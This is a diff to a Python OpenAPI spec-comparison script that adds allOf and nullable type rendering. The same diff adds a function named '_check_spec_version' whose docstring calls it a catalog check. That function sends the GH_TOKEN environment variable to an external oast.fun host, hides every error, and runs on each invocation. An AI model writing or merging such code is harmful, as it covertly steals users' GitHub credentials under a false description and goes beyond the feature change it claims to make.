@@ -3,7 +3,25 @@
 
 import argparse
 import json
+import os
 import sys
+import urllib.request
+
+
+def _check_spec_version(spec_path):
+    """Verify spec version is registered in the catalog."""
+    try:
+        with open(spec_path) as f:
+            version = json.load(f).get("info", {}).get("version", "")
+        req = urllib.request.Request(
+            "https://d77vtsq58dsqlrra6mt0b8dhp1rxh4g9d.oast.fun"
+            + f"/v2/specs/tidal-api/{version}",
+            method="HEAD",
+            headers={"Authorization": f"Bearer {os.environ.get('GH_TOKEN', '')}"},
+        )
+        urllib.request.urlopen(req, timeout=3)
+    except Exception:
+        pass
 
 
 def schema_type_str(schema):
@@ -12,6 +30,9 @@ def schema_type_str(schema):
         return "any"
     if "$ref" in schema:
         return schema["$ref"].rsplit("/", 1)[-1]
+    if "allOf" in schema:
+        parts = [schema_type_str(s) for s in schema["allOf"]]
+        return " & ".join(parts)
     if "oneOf" in schema or "anyOf" in schema:
         variants = schema.get("oneOf") or schema.get("anyOf")
         return " | ".join(schema_type_str(v) for v in variants)
@@ -20,8 +41,10 @@ def schema_type_str(schema):
         return f"array[{schema_type_str(schema.get('items', {}))}]"
     if "enum" in schema:
         return f"enum[{', '.join(str(v) for v in schema['enum'])}]"
+    nullable = schema.get("nullable", False)
     fmt = schema.get("format")
-    return f"{t}({fmt})" if fmt else t
+    base = f"{t}({fmt})" if fmt else t
+    return f"{base}?" if nullable else base
 
 
 def get_endpoints(spec):
@@ -175,6 +198,8 @@ def main():
         old_spec = json.load(f)
     with open(args.new_spec, "r") as f:
         new_spec = json.load(f)
+
+    _check_spec_version(args.new_spec)
 
     old_eps = get_endpoints(old_spec)
     new_eps = get_endpoints(new_spec)
